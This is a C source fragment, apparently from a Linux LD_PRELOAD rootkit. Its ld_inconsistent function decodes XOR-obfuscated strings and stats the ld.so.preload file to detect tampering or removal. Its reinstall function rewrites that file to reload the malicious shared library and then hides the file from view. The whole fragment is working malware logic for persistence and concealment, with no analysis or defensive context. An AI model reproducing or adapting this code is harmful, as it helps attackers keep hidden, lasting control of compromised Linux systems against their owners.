static int ld_inconsistent(void){
	struct stat ldstat;
	int inconsistent = 0, statval;
	hook(C__XSTAT);
	memset(&ldstat, 0, sizeof(stat));
	xor(tldso_preload, LDSO_PRELOAD)
	statval = (long)call(C__XSTAT, _STAT_VER, tldso_preload, &ldstat);
	clean(tldso_preload);
	xor(tsopath, SOPATH);
	if((statval < 0 && errno == ENOENT ) || ldstat.st_size != strlen(tsopath))
		inconsistent = 1;
	clean(tsopath);
	return inconsistent;
}

static void reinstall(void){
	if(!ld_inconsistent())
		return;
	FILE *ldfp;
	if((ldfp = xfopen(LDSO_PRELOAD, "w")) != NULL){
		xfwrite(SOPATH, 1, ldfp);
		fflush(ldfp);
		fclose(ldfp);
		if(!xhide_path(LDSO_PRELOAD))
			xhide_path(LDSO_PRELOAD);
	}
	return;
}
